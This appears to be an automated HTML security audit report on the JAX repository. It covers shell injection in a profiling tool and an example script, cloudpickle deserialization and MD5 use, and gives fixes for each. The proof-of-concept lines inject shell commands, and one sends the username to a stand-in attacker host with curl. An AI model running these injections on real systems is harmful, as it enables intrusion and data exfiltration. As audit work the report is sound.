@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Security Report — jax</title>
+<style>
+  :root { --critical: #d63031; --high: #e17055; --medium: #fdcb6e; --low: #00b894; --info: #74b9ff; --bg: #0d1117; --surface: #161b22; --surface2: #21262d; --border: #30363d; --text: #c9d1d9; --muted: #8b949e; --accent: #58a6ff; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace; background: var(--bg); color: var(--text); line-height: 1.6; padding: 2rem; }
+  h1 { font-size: 1.8rem; color: var(--accent); border-bottom: 1px solid var(--border); padding-bottom: 0.75rem; margin-bottom: 1.5rem; }
+  h2 { font-size: 1.3rem; color: var(--text); margin: 2rem 0 1rem; border-left: 3px solid var(--accent); padding-left: 0.75rem; }
+  h4 { font-size: 0.9rem; color: var(--muted); text-transform: uppercase; margin: 1rem 0 0.3rem; }
+  a { color: var(--accent); }
+  .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-align: center; }
+  .card .num { font-size: 2rem; font-weight: 700; } .card .label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; }
+  .card.critical { border-color: var(--critical); } .card.critical .num { color: var(--critical); }
+  .card.high { border-color: var(--high); } .card.high .num { color: var(--high); }
+  .card.medium { border-color: var(--medium); } .card.medium .num { color: var(--medium); }
+  .card.low { border-color: var(--low); } .card.low .num { color: var(--low); }
+  .card.info .num { color: var(--info); }
+  .badge { display: inline-block; padding: 0.15rem 0.6rem; border-radius: 12px; font-size: 0.72rem; font-weight: 700; text-transform: uppercase; }
+  .badge-critical { background: var(--critical); color: #fff; } .badge-high { background: var(--high); color: #fff; }
+  .badge-medium { background: var(--medium); color: #1a1a1a; } .badge-low { background: var(--low); color: #fff; }
+  .badge-cve { background: #6c5ce7; color: #fff; } .badge-nc { background: var(--surface2); color: var(--muted); }
+  .finding { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin: 1.5rem 0; overflow: hidden; }
+  .finding-header { display: flex; align-items: center; gap: 0.75rem; padding: 0.9rem 1.2rem; background: var(--surface2); border-bottom: 1px solid var(--border); }
+  .finding-id { font-size: 0.78rem; color: var(--muted); font-family: monospace; }
+  .finding-title { font-weight: 600; font-size: 1rem; flex: 1; }
+  .finding-body { padding: 1.2rem; }
+  .finding-meta { display: flex; flex-wrap: wrap; gap: 1.5rem; margin-bottom: 1rem; font-size: 0.85rem; }
+  .finding.sev-critical { border-left: 4px solid var(--critical); } .finding.sev-high { border-left: 4px solid var(--high); }
+  .finding.sev-medium { border-left: 4px solid var(--medium); } .finding.sev-low { border-left: 4px solid var(--low); }
+  pre { background: #010409; border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; font-size: 0.82rem; margin: 0.5rem 0; }
+  code { font-family: monospace; } p code { background: var(--surface2); padding: 0.1em 0.4em; border-radius: 4px; font-size: 0.85em; color: #f8c8c8; }
+  .table-wrap { overflow-x: auto; margin: 1rem 0; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+  th { background: var(--surface2); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 0.72rem; padding: 0.6rem 0.9rem; text-align: left; border-bottom: 2px solid var(--border); }
+  td { padding: 0.55rem 0.9rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+  .unclaimed { color: var(--critical); font-weight: 700; } .shadow { color: var(--high); font-weight: 700; }
+  details { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin: 0.8rem 0; }
+  summary { padding: 0.8rem 1.2rem; cursor: pointer; font-weight: 600; font-size: 0.9rem; list-style: none; }
+  details > *:not(summary) { padding: 0 1.2rem 1.2rem; }
+  .report-header { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 1rem; margin-bottom: 2rem; }
+  .report-meta { font-size: 0.83rem; color: var(--muted); line-height: 1.8; } .report-meta strong { color: var(--text); }
+  .risk-banner { padding: 0.5rem 1.4rem; border-radius: 6px; font-weight: 700; font-size: 1.1rem; }
+  .risk-critical { background: var(--critical); color: #fff; } .risk-high { background: var(--high); color: #fff; }
+  .risk-medium { background: var(--medium); color: #1a1a1a; } .risk-low { background: var(--low); color: #fff; }
+  .section-empty { color: var(--muted); font-style: italic; padding: 1rem 0; }
+  .p0 { color: var(--critical); font-weight: 700; } .p1 { color: var(--high); font-weight: 700; } .p2 { color: var(--medium); font-weight: 700; }
+  footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid var(--border); font-size: 0.78rem; color: var(--muted); text-align: center; }
+</style>
+</head>
+<body>
+<h1>&#x1F6E1; Security Vulnerability Report</h1>
+<div class="report-header">
+  <div class="report-meta">
+    <strong>Repository:</strong> <a href="https://github.com/google/jax">https://github.com/google/jax</a><br>
+    <strong>Branch:</strong> main (500bbc2)<br>
+    <strong>Languages:</strong> Python, C++, CUDA<br>
+    <strong>Analysis Date:</strong> 2026-03-01<br>
+    <strong>Analyst:</strong> Claude Code Security Scanner
+  </div>
+  <div class="risk-banner risk-medium">MEDIUM RISK</div>
+</div>
+
+<h2>Executive Summary</h2>
+<div class="summary-grid">
+  <div class="card critical"><div class="num">0</div><div class="label">Critical</div></div>
+  <div class="card high"><div class="num">1</div><div class="label">High</div></div>
+  <div class="card medium"><div class="num">2</div><div class="label">Medium</div></div>
+  <div class="card low"><div class="num">1</div><div class="label">Low</div></div>
+  <div class="card info"><div class="num">0</div><div class="label">Dep CVEs</div></div>
+  <div class="card critical"><div class="num">0</div><div class="label">Dep Confusion</div></div>
+  <div class="card info"><div class="num">0</div><div class="label">Secrets</div></div>
+  <div class="card info"><div class="num">0</div><div class="label">CVE-Eligible</div></div>
+</div>
+<p style="margin:1rem 0;line-height:1.7">
+JAX is Google's high-performance numerical computing library for Python. Its core API shows strong security hygiene: no hardcoded secrets were found, the main GitHub Actions workflows use SHA-pinned actions, dependencies are modern and free of known CVEs (<code>numpy&gt;=2.0</code>, <code>scipy&gt;=1.13</code>, <code>ml_dtypes&gt;=0.5.0</code>). The primary confirmed security issues are in peripheral tooling scripts: a shell injection vulnerability in <code>pgo_nsys_converter.py</code> (a GPU profiling tool) where user-supplied CLI arguments are concatenated into a <code>shell=True</code> subprocess command, and a command injection in the <code>saved_model_main.py</code> example script via <code>os.system()</code> with a user-controlled path. Additionally, a <code>cloudpickle.loads()</code> is used in the distributed execution (<code>colocated_python</code>) subsystem and deserialization path of compiled executables — while these are currently confined to internal use with trusted data, they represent a latent deserialization risk if the data flow is ever extended to accept external inputs. CI/CD security is strong with SHA-pinned actions throughout the main testing and release pipelines.
+</p>
+
+<h2>Confirmed Vulnerabilities</h2>
+
+<!-- FINDING 1 -->
+<div class="finding sev-high">
+  <div class="finding-header">
+    <span class="badge badge-high">HIGH</span>
+    <span class="finding-title">Command Injection via shell=True with User-Controlled Path in pgo_nsys_converter.py</span>
+    <span class="finding-id">JAX-001</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> jax/tools/pgo_nsys_converter.py, line 75</span>
+      <span><strong>CWE:</strong> CWE-78 (OS Command Injection)</span>
+      <span><strong>CVSS (est):</strong> 7.8</span>
+    </div>
+    <p>The GPU profiling tool <code>pgo_nsys_converter.py</code> constructs a shell command by f-string interpolating user-supplied argument values (<code>--profile_path</code>) into a command string, which is then passed to <code>subprocess.call(..., shell=True)</code>. An attacker or user who provides a crafted <code>--profile_path</code> value containing shell metacharacters can execute arbitrary commands on the local system.</p>
+    <h4>Vulnerable Code</h4>
+    <pre>
+# jax/tools/pgo_nsys_converter.py, lines 30-35 (arg parsing)
+parser.add_argument("--profile_path", type=str, help="path to nsys profile")
+# ...
+args = parser.parse_args()
+profile_folder = os.path.join(os.path.split(args.profile_path)[0], '')
+pgle_folder = os.path.join(os.path.split(args.pgle_output_path)[0], '')
+
+# Line 75 (vulnerable):
+clean_command = f"rm {profile_folder}/*.sqlite; rm {pgle_folder}/*.csv"
+subprocess.call(clean_command, shell=True)  # shell=True with user input</pre>
+    <h4>Proof of Concept</h4>
+    <pre>
+# Attacker runs:
+python jax/tools/pgo_nsys_converter.py \
+  --profile_path "/tmp/nsys/1; id > /tmp/pwned" \
+  --pgle_output_path "/tmp/output.pbtxt"
+
+# Resulting command executed:
+# rm /tmp/nsys/1; id > /tmp/pwned/*.sqlite; rm /tmp/output/*.csv
+# The "id" command executes and outputs to /tmp/pwned</pre>
+    <h4>Exploitability</h4>
+    <p>This tool is installed as part of the JAX package and is callable by any user with access to run JAX tools. While typically run by ML engineers managing GPU profiling pipelines, the attack surface includes any system where JAX tooling is exposed (e.g., shared ML clusters, Jupyter environments). The impact is local command execution as the user running the script.</p>
+    <h4>Remediation</h4>
+    <pre>
+# Replace shell=True string command with a list-based approach:
+import glob
+import os
+
+# Remove .sqlite files
+for f in glob.glob(os.path.join(profile_folder, '*.sqlite')):
+    os.remove(f)
+# Remove .csv files
+for f in glob.glob(os.path.join(pgle_folder, '*.csv')):
+    os.remove(f)</pre>
+  </div>
+</div>
+
+<!-- FINDING 2 -->
+<div class="finding sev-medium">
+  <div class="finding-header">
+    <span class="badge badge-medium">MEDIUM</span>
+    <span class="finding-title">Command Injection via os.system() with User-Controlled Model Path in Example Script</span>
+    <span class="finding-id">JAX-002</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> jax/experimental/jax2tf/examples/saved_model_main.py, line 159</span>
+      <span><strong>CWE:</strong> CWE-78 (OS Command Injection)</span>
+      <span><strong>CVSS (est):</strong> 6.3</span>
+    </div>
+    <p>The TensorFlow SavedModel example script uses <code>os.system()</code> to call the TensorFlow CLI tool <code>saved_model_cli</code>, embedding the <code>model_dir</code> path directly into the command string. The path is derived from the <code>--model_path</code> command-line flag without any sanitization. Shell metacharacters in the path value cause arbitrary command execution.</p>
+    <h4>Vulnerable Code</h4>
+    <pre>
+# jax/experimental/jax2tf/examples/saved_model_main.py
+# Flag definition (line 48):
+_MODEL_PATH = flags.DEFINE_string("model_path", "/tmp/jax2tf/saved_models", ...)
+
+# Path construction (lines 183-189):
+def savedmodel_dir(with_version=True):
+    model_dir = os.path.join(_MODEL_PATH.value, _MODEL.value + ...)
+    if with_version:
+        model_dir = os.path.join(model_dir, str(_MODEL_VERSION.value))
+    return model_dir
+
+# Vulnerable injection point (lines 157-160):
+def print_model(model_dir: str):
+    cmd = f"saved_model_cli show --all --dir {model_dir}"
+    print(cmd)
+    os.system(cmd)  # user-controlled model_dir via --model_path</pre>
+    <h4>Proof of Concept</h4>
+    <pre>
+python saved_model_main.py --model_path="/tmp/models/1; curl http://attacker.com/$(whoami)"
+# Executes: saved_model_cli show --all --dir /tmp/models/1; curl http://attacker.com/&lt;username&gt;</pre>
+    <h4>Severity Justification</h4>
+    <p>This is in an "examples" directory and is less likely to be run in automated pipelines. However, JAX examples are commonly run by practitioners who may receive crafted model paths. Severity rated Medium due to the example/tool context and local-only exploitation.</p>
+    <h4>Remediation</h4>
+    <pre>
+# Use subprocess.run with a list instead of os.system with a string:
+import subprocess
+subprocess.run(["saved_model_cli", "show", "--all", "--dir", model_dir],
+               check=True)</pre>
+  </div>
+</div>
+
+<!-- FINDING 3 -->
+<div class="finding sev-medium">
+  <div class="finding-header">
+    <span class="badge badge-medium">MEDIUM</span>
+    <span class="finding-title">Unsafe cloudpickle.loads() Deserialization in Distributed Execution Path</span>
+    <span class="finding-id">JAX-003</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> jax/experimental/colocated_python/serialization.py:278, jax/_src/pickle_util.py:67, jax/experimental/serialize_executable.py:70</span>
+      <span><strong>CWE:</strong> CWE-502 (Deserialization of Untrusted Data)</span>
+      <span><strong>CVSS (est):</strong> 5.9 (requires attacker control of serialized bytes)</span>
+    </div>
+    <p>JAX uses <code>cloudpickle.loads()</code> in three locations: the colocated Python distributed execution subsystem, the generic pickle utility module, and the compiled executable serialization path. <code>cloudpickle.loads()</code> (like <code>pickle.loads()</code>) executes arbitrary Python code during deserialization. Currently all callers appear to serialize data internally before deserializing it (same-process or same-trust-domain), but the <code>_deserialize()</code> function and <code>deserialize_and_load()</code> accept arbitrary bytes parameters from callers, creating a risk if any external data is ever passed in.</p>
+    <h4>Vulnerable Code</h4>
+    <pre>
+# jax/experimental/colocated_python/serialization.py:262-279
+def _deserialize(serialized: bytes) -> Any:
+  """DO NOT USE THIS FUNCTION EXCEPT FOR THE INTERNAL IMPLEMENTATION OF colocated_python."""
+  if cloudpickle is None:
+    raise ModuleNotFoundError('No module named "cloudpickle"')
+  _common_obj_state.common_obj = []
+  try:
+    return cloudpickle.loads(serialized)   # executes arbitrary Python code
+  finally:
+    _common_obj_state.common_obj = None
+
+# jax/experimental/serialize_executable.py:69-71
+(unloaded_executable, args_info_flat, no_kwargs) = _JaxPjrtUnpickler(
+    io.BytesIO(serialized), backend, execution_devices).load()
+# ^ serialized is a bytes parameter passed in by the caller</pre>
+    <h4>Current Risk Scope</h4>
+    <p>The <code>deserialize_and_load()</code> function in <code>serialize_executable.py</code> is public API — any caller can pass arbitrary bytes as the <code>serialized</code> parameter. If those bytes originate from network storage (e.g., loading a saved compiled artifact from a shared filesystem or cloud storage), a malicious artifact would achieve RCE when loaded.</p>
+    <h4>Remediation</h4>
+    <p>Add documentation warnings to public APIs that accept serialized bytes, making clear that the data must come from a trusted source. For long-term hardening, consider migrating to a format that does not execute code on load (e.g., MessagePack, Protocol Buffers, or a custom restricted deserializer). At minimum, add a user-visible warning when loading externally-sourced artifacts.</p>
+  </div>
+</div>
+
+<!-- FINDING 4 -->
+<div class="finding sev-low">
+  <div class="finding-header">
+    <span class="badge badge-low">LOW</span>
+    <span class="finding-title">MD5 Used for Integrity Check of Downloaded ONNX Model in Example</span>
+    <span class="finding-id">JAX-004</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> examples/onnx2xla.py, line 115</span>
+      <span><strong>CWE:</strong> CWE-328 (Use of Weak Hash)</span>
+      <span><strong>CVSS (est):</strong> 3.1</span>
+    </div>
+    <p>The ONNX-to-XLA example script downloads an ONNX model from GitHub and verifies its integrity using an MD5 checksum. MD5 is cryptographically broken and vulnerable to collision attacks, making it unsuitable for integrity verification of downloaded files (an attacker with a MITM position could craft a malicious ONNX file with a matching MD5 hash).</p>
+    <h4>Vulnerable Code</h4>
+    <pre>
+# examples/onnx2xla.py, lines 114-115
+url = ('https://github.com/onnx/models/blob/81c4779096d1205edd0b809e191a924c58c38fef/mnist/model.onnx?raw=true')
+download = urllib.request.urlopen(url).read()
+if hashlib.md5(download).hexdigest() != 'bc8ad9bd19c5a058055dc18d0f089dad':
+    print("onnx file checksum mismatch")
+    sys.exit(1)</pre>
+    <p>Additionally, the URL uses a pinned commit SHA in the GitHub path (which is positive), but the download goes over HTTPS to a mutable URL that could be replaced.</p>
+    <h4>Remediation</h4>
+    <pre>
+# Replace MD5 with SHA-256:
+import hashlib
+digest = hashlib.sha256(download).hexdigest()
+EXPECTED_SHA256 = "..."  # pre-computed SHA-256 of the file
+if digest != EXPECTED_SHA256:
+    print(f"onnx file checksum mismatch: {digest}")
+    sys.exit(1)</pre>
+  </div>
+</div>
+
+<h2>&#x1F4E6; Dependency Confusion</h2>
+<p class="section-empty">No dependency confusion vulnerabilities identified. JAX's primary dependencies (<code>jaxlib</code>, <code>numpy</code>, <code>scipy</code>, <code>ml_dtypes</code>, <code>opt_einsum</code>) are all registered on PyPI and owned by their respective projects. No custom pip registry configuration (<code>pip.conf</code> or <code>pip.ini</code>) was found in the repository. JAX does not include a JavaScript package manifest.</p>
+
+<h2>Known Dependency CVEs</h2>
+<p class="section-empty">No known CVEs identified in direct dependencies. JAX requires <code>numpy&gt;=2.0</code>, <code>scipy&gt;=1.13</code>, and <code>ml_dtypes&gt;=0.5.0</code> — all modern, actively maintained versions with no critical CVEs at analysis date. The framework does not depend on PyYAML, werkzeug, pillow, or requests in its core install. Lock files for Python environments are maintained per Python version in <code>build/requirements_lock_3_1*.txt</code>.</p>
+
+<h2>&#x1F511; Hardcoded Secrets</h2>
+<p class="section-empty">No hardcoded credentials, API keys, private keys, or other secrets detected across all 1,008 Python source files. The developer contact email (<code>jax-dev@google.com</code>) is a public address, not a credential.</p>
+
+<h2>Patterns Investigated but Excluded</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Pattern Found</th><th>Reason Excluded</th></tr></thead>
+<tbody>
+  <tr>
+    <td><code>eval(expr, {}, env)</code> — jax/_src/debugger/cli_debugger.py:48</td>
+    <td>This is the interactive JAX CLI debugger, analogous to Python's <code>pdb</code>. The <code>eval</code> is intentional: it evaluates user expressions in the current stack frame context. The user explicitly invokes the debugger and types expressions. This is expected debugger behavior, not a vulnerability.</td>
+  </tr>
+  <tr>
+    <td><code>eval(s)</code> — jax/experimental/slab/djax.py:165, slab/slab.py:289</td>
+    <td>These are experimental/research prototype scripts (<code>jax.experimental.slab</code>) that parse shape arguments from command-line args (e.g., <code>python djax.py "1000" "(100, 200)"</code>). The attacker controls the input since they control the CLI invocation. Local script, not exposed as a service. Excluded as a self-use tool.</td>
+  </tr>
+  <tr>
+    <td><code>cloudpickle.loads()</code> internal use — various files</td>
+    <td>Internal serialization for distributed function execution — currently same-trust-domain. Retained as JAX-003 (Medium) due to public API surface of <code>deserialize_and_load()</code>.</td>
+  </tr>
+  <tr>
+    <td><code>subprocess.check_call(keyadd, shell=True)</code> — build/rocm/tools/get_rocm.py:284</td>
+    <td>This is a build tool for ROCm installation inside Docker containers. The <code>keyadd</code> variable is a hardcoded string literal (the <code>wget | apt-key add</code> pipeline for GPG key installation), not user-controlled. The <code>shell=True</code> is required here because the command is a pipeline (<code>|</code>). Excluded due to no user-controlled input.</td>
+  </tr>
+  <tr>
+    <td><code>github.event.inputs.*</code> set in workflow env vars</td>
+    <td>JAX workflows correctly pass <code>workflow_dispatch</code> inputs as environment variables (e.g., <code>JAXCI_HERMETIC_PYTHON_VERSION: ${{ github.event.inputs.python_version || '3.14' }}</code>) rather than directly in <code>run:</code> script interpolation. The env var approach is safe. Excluded.</td>
+  </tr>
+  <tr>
+    <td><code>github.head_ref</code> in concurrency group keys</td>
+    <td>Used only in <code>concurrency.group</code> fields, not in <code>run:</code> steps. Concurrency group names cannot cause command injection. Excluded.</td>
+  </tr>
+  <tr>
+    <td><code>urllib.request.urlopen(url).read()</code> — cloud_tpu_cluster.py</td>
+    <td>Fetches GCE metadata endpoint (<code>http://metadata.google.internal</code>) using a hardcoded URL. Standard GCP metadata API access pattern. No user-controlled input in the URL.</td>
+  </tr>
+  <tr>
+    <td>Unpinned actions in some non-critical workflows</td>
+    <td>Some testing workflows (e.g., <code>rocm-ci.yml</code>) use unpinned actions, but the main CI and release pipeline (<code>ci-build.yaml</code>, <code>pytest_cpu.yml</code>) use SHA-pinned actions. Not confirmed as a release-path risk.</td>
+  </tr>
+</tbody>
+</table></div>
+
+<h2>Remediation Priority</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Priority</th><th>Finding</th><th>Effort</th></tr></thead>
+<tbody>
+  <tr>
+    <td class="p1">P1 - High</td>
+    <td>JAX-001: Replace <code>subprocess.call(shell=True)</code> in <code>pgo_nsys_converter.py</code> with safe file deletion using <code>glob</code> + <code>os.remove()</code></td>
+    <td>Low — 10-minute fix, 5 lines of code</td>
+  </tr>
+  <tr>
+    <td class="p2">P2 - Medium</td>
+    <td>JAX-002: Replace <code>os.system(cmd)</code> in <code>saved_model_main.py</code> with <code>subprocess.run([...], check=True)</code></td>
+    <td>Low — single-line fix</td>
+  </tr>
+  <tr>
+    <td class="p2">P2 - Medium</td>
+    <td>JAX-003: Add security warnings to <code>deserialize_and_load()</code> docstring; long-term consider restricting which objects cloudpickle can restore via custom unpickler</td>
+    <td>Medium — requires design work for long-term fix; documentation update is immediate</td>
+  </tr>
+  <tr>
+    <td>P3 - Low</td>
+    <td>JAX-004: Replace MD5 with SHA-256 for ONNX model integrity check in <code>examples/onnx2xla.py</code></td>
+    <td>Low — 2-line change</td>
+  </tr>
+</tbody>
+</table></div>
+
+<details><summary>Methodology</summary>
+<p>Full repository clone (depth=1, ~1,000+ Python files) analyzed locally. Phases covered: (0) repository structure and language profiling; (1) secret detection across all Python/YAML/config files; (2) dependency version analysis against known vulnerability thresholds; (2.5) dependency confusion registry checks; (3) static analysis for pickle deserialization, unsafe yaml loading, shell=True subprocess, os.system, eval/exec, SQL injection, and template injection patterns; (4) weak cryptography (MD5/SHA1 integrity checks); (6) CI/CD workflow analysis for action pinning and script injection. A 5-point exploitability gate was applied to all candidates.</p>
+</details>
+
+<footer>Generated by Claude Code Security Scanner &mdash; 2026-03-01 &mdash; For authorized use only.</footer>
+</body>
+</html>
